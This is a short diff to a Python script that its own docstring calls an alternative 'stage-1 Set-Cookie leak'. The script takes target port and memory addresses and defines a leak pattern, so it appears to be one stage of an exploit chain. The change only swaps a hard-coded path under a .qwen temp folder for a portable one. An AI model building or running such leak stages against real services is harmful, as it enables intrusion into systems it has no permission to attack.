@@ -6,10 +6,11 @@ stage-1 Set-Cookie leak. This is the alternative stage-1 for versions where ours
 
 usage: python leak9bie.py --port 18111 --zif 0x39b8a0 --dtor 0x487650 [--tries 3]
 """
+import os
 import argparse, os, subprocess, sys, struct, urllib.parse
 from collections import Counter
 
-GH = r"C:\Users\likat\.qwen\tmp\p2s"
+GH = os.path.join(os.path.expanduser("~"), ".qwen", "tmp", "p2s")
 LEAK_SPEC = ",".join(["G:511:0x137"] * 14 + ["G:400:0x137", "G:511:0x137", "X:900"])
 MAIN_BUCKET_COUNT = 87
 
